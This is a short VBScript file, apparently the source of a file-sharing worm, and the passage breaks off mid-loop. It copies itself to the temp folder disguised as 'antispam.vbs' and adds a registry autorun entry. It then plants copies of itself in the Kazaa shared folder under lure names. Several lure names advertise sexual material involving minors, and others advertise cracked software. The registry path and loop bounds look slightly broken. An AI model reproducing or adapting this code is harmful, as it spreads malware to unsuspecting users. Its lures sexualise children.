set shell = createobject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
Ryamlhcip = wscript.scriptfullname
fso.copyfile Ryamlhcip,fso.getspecialfolder(2) & "\antispam.vbs"
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runfaststart",fso.getspecialfolder(2)& "\antispam.vbs"
Pgdir = shell.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
files = array("download104444910020136484.dat","Killer!!! amateur gangbang bukkake cumshot facials.mpg","american bukkake record - 122 cum shots.avi","(Russian-Lolitas) Teen Girls Dancing Naked!!!.mpg","spermabande.jpg","Young lolitas fuckfest.jpg","Teeny Exzesse - The List.doc","Japanese Bukkake swallows all(underage pic).jpg","keygen.rar","keygen-crack-all versions 2003.zip","Tatu-lesbian kiss.jpg")
kl = (Pgdir & "\kazaa lite\my shared folder") & "\"
if fso.folderexists(kl) then
 for x=0 to 11
  fso.copyfile Ryamlhcip,kl & files(x) & ".vbs"